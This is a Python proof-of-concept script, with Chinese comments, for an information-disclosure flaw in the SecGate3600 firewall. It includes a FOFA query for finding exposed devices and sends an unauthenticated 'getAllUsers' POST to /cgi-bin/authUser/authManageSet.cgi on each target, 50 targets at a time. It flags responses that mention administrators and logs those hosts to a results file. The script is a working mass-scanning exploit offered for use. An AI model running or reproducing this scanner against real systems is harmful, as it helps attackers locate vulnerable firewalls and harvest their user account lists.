# 网神SecGate3600_authManageSet.cgi信息泄露漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# body="sec_gate_image/login_02.gif!"

def banner():
    test = """
██╗    ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗██╗  ██╗███████╗███╗   ██╗
██║    ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║  ██║██╔════╝████╗  ██║
██║ █╗ ██║███████║██╔██╗ ██║██║  ███╗███████╗███████║█████╗  ██╔██╗ ██║
██║███╗██║██╔══██║██║╚██╗██║██║   ██║╚════██║██╔══██║██╔══╝  ██║╚██╗██║
╚███╔███╔╝██║  ██║██║ ╚████║╚██████╔╝███████║██║  ██║███████╗██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
                                                                       
                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='网神SecGate3600_authManageSet.cgi信息泄露漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/cgi-bin/authUser/authManageSet.cgi"
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/108.0.0.0Safari/537.36',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
    }
    data = "type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"

    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        if response.status_code == 200 and '管理员' in response.text:
            print(f"[+]{target} 存在信息泄露漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在信息泄露漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")



if __name__ == '__main__':
    main()